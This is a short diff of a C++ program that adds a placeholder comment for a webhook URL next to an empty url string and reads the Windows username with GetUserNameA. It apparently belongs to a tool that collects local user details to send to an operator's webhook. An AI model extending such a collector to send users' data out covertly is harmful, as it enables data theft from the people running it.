@@ -13,9 +13,11 @@ namespace fs = std::filesystem;
 int main()
 {
 	std::string message;
+	
+	//Place your WEBHOOKURL here
 	std::string url = "";
 
-	// Get Username of Windows User
+	// Get Username
 	char username[UNLEN + 1];
 	DWORD username_len = UNLEN + 1;
 	GetUserNameA(username, &username_len);
